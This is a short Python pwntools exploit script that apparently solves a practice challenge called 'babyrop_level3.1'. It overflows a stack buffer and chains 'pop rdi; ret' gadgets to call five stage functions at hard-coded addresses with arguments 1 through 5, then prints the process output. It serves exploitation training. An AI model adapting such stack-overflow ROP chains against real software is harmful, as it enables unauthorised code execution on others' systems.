from pwn import *

p = process("./babyrop_level3.1")

payload = b""
payload += b"A" * 48
payload += b"B" * 8
# pop rdi ; ret
payload += p64(0x401bf3)
payload += p64(0x1)
# stage 1
payload += p64(0x4018d2)
# pop rdi ; ret
payload += p64(0x401bf3)
payload += p64(0x2)
# stage 2
payload += p64(0x40162d)
# pop rdi ; ret
payload += p64(0x401bf3)
payload += p64(0x3)
# stage 3
payload += p64(0x4017f0)
# pop rdi ; ret
payload += p64(0x401bf3)
payload += p64(0x4)
# stage 4
payload += p64(0x4019ae)
# pop rdi ; ret
payload += p64(0x401bf3)
payload += p64(0x5)
# stage 5
payload += p64(0x40170d)

p.sendline(payload)

print(p.recvall())
